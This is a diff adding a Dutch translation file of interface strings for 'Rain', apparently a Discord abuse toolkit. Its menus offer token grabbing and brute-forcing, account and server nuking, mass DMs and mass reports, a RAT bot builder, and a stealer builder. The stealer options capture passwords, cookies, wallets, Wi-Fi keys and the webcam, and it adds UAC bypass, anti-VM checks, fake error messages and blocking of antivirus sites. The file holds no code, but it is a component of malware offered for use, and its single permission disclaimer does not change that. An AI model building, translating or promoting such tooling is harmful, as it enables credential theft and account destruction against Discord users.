@@ -1,0 +1,396 @@
+Token-informatie{end_space9}
+Token Inloggen{end_space12}
+Token Nuker{end_space14}
+Token Grijper{end_space12}
+Token Uitschakelaar{end_space6}
+Token Brute-Force{end_space8}
+Nep Typer{end_space16}
+IJdelheid Sniper{end_space9}
+Groepschat Spammer{end_space7}
+Vrienden Blokkeerder{end_space5}
+Vrienden Verwijderaar{end_space9}
+Verzoek Verwijderaar{end_space5}
+Nieuwe servers aanmaken{end_space2}
+Profiel Veranderaar{end_space6}
+QR-code grijper{end_space10}
+Discord Rat Bot{end_space10}
+Knop Indrukker{end_space11}
+Bericht Reactor{end_space10}
+Massa DM{end_space17}
+Massa Rapportage{end_space9}
+Massa Vriend{end_space13}
+DM Verwijderaar{end_space10}
+DM Wiskundige{end_space12}
+Regels Omzeilen{end_space10}
+Herstelkoord omzeilen{end_space4}
+Sledehamer omzeilen{end_space6}
+Webhook Gereedschap{end_space6}
+Gemaakt door Plingenn{end_space4}
+Wijzigingslogboek{end_space8}
+Instellingen{end_space13}
+Chat
+Beheer Tokens
+Volg Pagina
+Uitvoeren op:{end_space13}
+Ongeldige keuze, probeer het opnieuw!
+Onderbroken door gebruiker.
+Thema Wisselaar
+Accountinstellingen
+Proxy-instellingen
+Uiterlijke instellingen
+Debugmodus omzetten
+Beheerderspaneel
+Ongeldige instelling
+CYAAN
+BLAUW
+GROEN
+ROOD
+WIT
+GEEL
+MAGENTA
+LICHTROOD
+LICHTBLAUW
+LICHTGROEN
+LICHTCYAN
+LICHTZWART
+Thema ingesteld op
+Account Overzicht
+Mijn Licentie
+Aankoopgeschiedenis
+Code inwisselen
+Software Downloaden
+Gebruikersnaam
+Gemaakt op
+Gebruikersnaam wijzigen
+Uitloggen
+Gebruikersnaam wijzigen mislukt, De gebruikersnaam moet minstens 3 tekens bevatten.
+Wilt u uitloggen van uw account? (J/N)
+Product
+Vervalt op
+Datum
+Voer uw productcode in om uw inhoud te ontvangen.
+Code
+U heeft de code al ingewisseld.
+Zorg ervoor dat u uw product opslaat voordat u op Enter drukt!
+Sleutel niet gevonden in de reactie
+Kon geen gegevens ophalen voor de opgegeven code
+URL niet gevonden in de code-informatie
+Ongeldige Code!
+Proxy Gebruik omzetten
+Proxy Cache wissen
+Eigen Proxies toevoegen aan Cache
+Proxy scrapen
+Ongeldige Keuze
+Debug Modus omgezet {RED}UIT
+Debug Modus omgezet {GREEN}AAN
+Nieuw Authenticatiesysteem toegevoegd
+Verbeterd Configuratiesysteem
+Paneelinterface opnieuw gemaakt
+Chat systeem toegevoegd
+Nieuwe accountinstellingen toegevoegd
+Caching geïmplementeerd voor betere prestaties
+Aangepaste Discord RPC
+Discord RPC omzetten
+Aangepaste Discord RPC omzetten
+Aangepaste Discord RPC bewerken
+Aangepaste Discord RPC uitgeschakeld
+Aangepaste Discord RPC ingeschakeld
+Details (Vereist)
+Details moeten minimaal 3 tekens lang zijn.
+Staat (Vereist)
+Staat moet minstens 3 tekens lang zijn.
+Grote afbeeldings-URL (Optioneel)
+Grote tekst (Optioneel)
+Kleine afbeeldings-URL (Optioneel)
+Kleine tekst (Optioneel)
+Hoeveel knoppen wilt u hebben?
+Voer label in voor knop
+Voer URL in voor knop
+Ongeldig URL-formaat. Voer alstublieft een geldige URL in.
+Ongeldig aantal knoppen. Voer alstublieft een getal in tussen 0 en 2.
+Discord RPC uitgeschakeld
+Discord RPC ingeschakeld
+Normale modus
+RestoreCord-modus (omzeil captcha)
+Cache Controleur
+Aangepaste Controleur
+Server Controleur
+Voer het aangepaste pad in om tokens te laden van
+Normale Chat
+Ondersteuningschat (Niet beschikbaar)
+Privé Chat (Niet beschikbaar)
+Server Opzoeken{end_space10}
+Server Kloner{end_space12}
+Server Vernietiger{end_space7}
+Token Joiner{end_space13}
+Token Verlater{end_space11}
+Token Spammer{end_space12}
+Aanval{end_space19}
+Geluidsboard Spammer{end_space5}
+Voice Chat Toetreden{end_space5}
+Profielafbeelding Veranderaar
+Globale Bijnaamwisselaar{end_space1}
+Server Bijnaam Veranderaar{end_space2}
+HypeSquad Veranderaar{end_space4}
+Aanwijzingen Veranderaar{end_space1}
+Taal Veranderaar{end_space9}
+Status Veranderaar{end_space7}
+Thema Veranderaar{end_space8}
+Biografie Veranderaar{end_space4}
+Account Generator{end_space8}
+VideoCrash Maker{end_space9}
+Instellingen Cycler{end_space10}
+Patch Notities{end_space11}
+Telegram{end_space17}
+Selfbot{end_space18}
+Github{end_space19}
+Over{end_space21}
+Afsluiten{end_space16}
+Vorige Pagina{end_space2}
+Servernamen
+Bericht
+Aantal Threads
+Er is een fout opgetreden:
+Geen tokens gevonden in cache
+Rain Nuke implementeren
+Rain Nuke geïmplementeerd. . .
+Berichten
+Bericht-ID:
+Een bericht verzonden naar alle beschikbare vrienden.
+Guild verlaten:
+Guild verwijderd:
+De volgende fout is opgetreden en wordt genegeerd:
+Alle beschikbare guilds verwijderd/verlaten.
+Vriend verwijderen:
+Vriend verwijderd:
+Alle beschikbare vrienden verwijderd.
+Aan het creëren
+Gecreëerd
+Alle servers aangemaakt.
+Rain Nuke succesvol tot ontploffing gebracht!
+Met succes omgezet in een Reme Wasteland
+Voer iets in om door te gaan. . .
+Starten van aanvalsmodus (Schakelen tussen licht/donker modus)
+Onvoldoende vrienden om door te gaan.
+Er is een fout opgetreden tijdens de verwerking van de token
+Kanaal Spammer
+Kanaal ID
+Regels Omzeilen
+Guild ID
+Nep Typer met Token
+Globale Nicker
+Bijnaam
+Server Nicker
+Aanwijzingen Veranderaar
+Willekeurige Aanwijzingen (j/n)
+Aanwijzingen
+DM verwijderd:
+Onvoldoende DM's om door te gaan.
+Cyclus onderbroken
+Geluidsboard Spammer
+Programma onderbroken door gebruiker.
+Het verzenden van een hartslag met token is mislukt:
+Het toetreden tot VC met token is mislukt:
+Toetreden tot VC met Tokens..
+Uitnodiging succesvol bijgewerkt, uw server kan nu worden geopend door
+Het bijwerken van de vanity-URL is mislukt. Statuscode:
+Vanity-code om te snipen
+Server-ID om vanity toe te passen op
+Vertraging tussen controles (seconden)
+Vanity Sniper is gestart. Druk op Ctrl+C om te stoppen.
+Fout:
+Webhook Spammer
+Webhook Verwijderaar
+Webhook
+Webhook succesvol verwijderd
+Token Manager
+Tokens Opslaan
+Tokens Wissen
+Controleer Tokens En Bewaar Alleen Geldige (j/n)
+Tokens Cache Geleegd.
+Voer het pad naar het tekstbestand met tokens in
+Geen tokens gevonden in het opgegeven tekstbestand
+Token Checker
+Het ophalen van de servernaam is mislukt:
+Bezig met toetreden
+Rain token brute-force. PS: Dit kan lang duren om te werken.
+Als je extreem geluk hebt en in staat bent om iemands token te bemachtigen, zul je ontdekken dat het is opgeslagen in 'brute-force.txt'.
+Zoek altijd expliciete toestemming van de persoon voordat je een brute force-aanval uitvoert op hun account.
+Ongeldige gebruikers-id, probeer het opnieuw!
+GELDIG
+ONGELDIG
+Fout bij het ophalen van factureringsgegevens:
+Fout bij het ophalen van nitrogegevens:
+Geen factureringsinformatie beschikbaar.
+Verzamelen van gebruikersinformatie en webdrivers..
+Bestandsnaam
+Bestandswachtwoord
+Wilt u een pictogrambestand opgeven? (J/N)
+Ongeldig pictogram pad of URL. Instelling pictogram op Geen.
+Ping Me (J/N)
+Anti VM (J/N)
+Opstarten (J/N)
+UacBypass (J/N)
+Smelten (J/N)
+Console Verbergen (J/N)
+Webcam Vastleggen (J/N)
+Wachtwoorden Vastleggen (J/N)
+Cookies Vastleggen (J/N)
+Autovullingen Vastleggen (J/N)
+Geschiedenis Vastleggen (J/N)
+Discord Tokens Vastleggen (J/N)
+Spellen Vastleggen (J/N)
+Wifi Wachtwoorden Vastleggen (J/N)
+Systeeminfo Vastleggen (J/N)
+Schermopname Vastleggen (J/N)
+Telegram Vastleggen (J/N)
+Gemeenschappelijke Bestanden Vastleggen (J/N)
+Portemonnees Vastleggen (J/N)
+NepFout (J/N)
+NepFoutTitel
+NepFoutBericht
+Blokkering van AV-sites (J/N)
+DiscordInjectie (J/N)
+Bestandspictogram
+Aan het maken van {name}.exe, Dit zal enkele seconden duren. Bedankt voor uw geduld!
+Het bestand bevindt zich in 'output/grabberbuilder/{name}.exe'
+Groepschat aangemaakt
+Tarieflimiet ({response.json()['retry_after']}ms)
+Niet genoeg vrienden beschikbaar voor willekeurige selectie
+Wilt u zelf gebruikers selecteren voor groepschat spammen of wilt u willekeurige selecties maken?
+Selecteer zelf gebruikers
+Willekeurige gebruikers selecteren
+Groepschats aan het aanmaken
+Gebruiker-ID's
+Je had geen komma's (,) formaat is id,id2,id3
+Op elk moment om te stoppen
+Geblokkeerd:
+Fout bij het verkrijgen van relaties:
+Niet genoeg vriendverzoeken om door te gaan.
+Inkomend vriendverzoek van:
+Verwijderd vriendverzoek van:
+Totaal aantal verwijderde vriendverzoeken:
+Er is een fout opgetreden tijdens het maken van {server_name}: {e}
+pictogram voor de servers ja/nee
+Willekeurige servernamen
+Aangepaste servernamen
+Naam van de servers die zullen worden aangemaakt
+Voer de pictogramlocatie in
+Kan "{image}" niet vinden op uw pc
+Aangepaste status
+Aangepaste biografie
+Bestand aan het maken... {i}
+Bestand aan het schrijven... {i}
+Opmerking: Deze code werkt momenteel niet volledig, maar is nog steeds uitvoerbaar. \nU kunt echter fouten of bugs tegenkomen.
+Voer de naam in die u aan het uiteindelijke bestand wilt geven
+Voer de token in van de bot die u zult gebruiken om de RAT-opdrachten uit te voeren
+Bot token
+Voer het server-ID in waarop de schuine streepopdrachten zijn geregistreerd
+Fout bij het schrijven van het bestand: {e}
+Bestand is correct geschreven naar "output/{fileName}.py"
+Converteer uw script naar een uitvoerbaar bestand (J/N)
+Bestandscreatie...
+Oude bestanden opruimen...
+Het uitvoerbare bestand is correct gegenereerd
+Er is een HTTP-fout opgetreden: {e}
+Bericht-ID
+Selecteer alstublieft de knop die u wilt indrukken
+{r}({LIGHTBLACK_EX}{i}{r}) Naam: {LIGHTBLACK_EX}{button_label}{r}, Aangepaste ID: {LIGHTBLACK_EX}{button_custom_id}
+Knop
+Er is slechts één knop gevonden in het bericht.
+Mislukt om reactie {reaction} toe te voegen aan bericht {message_id}. Maximum aantal reacties al bereikt.
+Maximum aantal reacties al bereikt.
+Mislukt om reactie {reaction} toe te voegen aan bericht {message_id}. Verboden: {error_message}
+Objecten
+Gezichten
+Dieren
+Symbolen
+Geen emoji's gevonden in de respons
+Kon geen emoji's ophalen van de API
+Uitnodigingslink
+Ongeldige uitnodigingslinkindeling.
+Er is een fout opgetreden tijdens het verzenden van het verzoek
+Uitnodigingsinformatie:
+Uitnodigerinformatie:
+Serverinformatie:
+Kanaal
+Vervaldatum
+Gebruikers-ID
+Badges
+Niet beschikbaar
+Naam
+Server-ID
+Beschrijving
+Banner
+Banner-URL
+Banner-URL (Niet beschikbaar)
+Vanity-URL
+Verificatieniveau
+Splash
+Splash-URL
+Splash-URL (Niet beschikbaar)
+Kenmerken
+Aanval Gestart. Druk op Ctrl+C om te stoppen.
+Aanval onderbroken
+Taalcyclus is gestart. Druk op Ctrl+C om te stoppen.
+Ongeldige Token.
+Druk op ENTER om door te gaan
+Discord API-tool | https://Rain.xyz | Gemaakt door Plingenn
+Uiterlijkinstellingen
+Tekstinstellingen
+Cursorinstellingen
+Transparantie-instellingen
+Vensterinstellingen
+Taalinstellingen
+Kleurenschema
+Lettertype
+Lettergrootte
+Regelhoogte
+Letterdikte
+Retro Terminal-effecten
+Kleurinstellingen
+Lettertype-instellingen
+Lettergrootte-instellingen
+Regelhoogte-instellingen
+Letterdikte-instellingen
+Retro-instellingen
+Cursorinstellingen
+Taal ingesteld op {chosen_language}
+Naamloos
+Type
+Huis
+Berichtlink
+Ongeldige berichtlink
+Terug gaan...
+Kon geen verbinding maken met Discord RPC: {e}
+Keuze
+Thema
+Instelling
+Bewerken
+Taal
+Paneel Doorzichtigheid
+Ongeldige Doorzichtigheid
+Vensterinstellingen
+Deze optie is nog in ontwikkeling
+Deze optie is momenteel niet beschikbaar. Wees geduldig, het wordt later toegevoegd.
+Deze optie is momenteel niet beschikbaar.
+Het zal in een van de komende updates worden vervangen door: '{replacement}'.
+Deze optie is niet beschikbaar
+Deze opties zijn momenteel in ontwikkeling
+Deze opties zijn momenteel in ontwikkeling maar blijven bruikbaar. Het is echter mogelijk dat er bugs of fouten optreden.
+Kon geen voornaamwoorden ophalen van {pronounce_url} ({statuscode})
+Proxygebruik is momenteel niet beschikbaar. Onze excuses voor het ongemak. Het zal toegankelijk worden gemaakt in een van onze volgende updates.
+Proxy Gebruik omgezet {ROOD}UIT
+Proxy Gebruik omgezet {GROEN}AAN
+Nieuwe Proxies Succesvol Geschreven
+Proxies Succesvol Verzameld
+Klaar! In totaal {proxies} verzameld => {temp} | {execution_time}ms
+PC{end_space7}
+Implementatie van ondersteuning voor meerdere talen.
+Massadraad{end_space15}
+Forumspammer
+Massale Gebruiker DM{end_space5}
+N/B (niet van toepassing)
+Serverbooster{end_space17}
+Token online gebruiker{end_space3}
+Peilingmaker{end_space13}
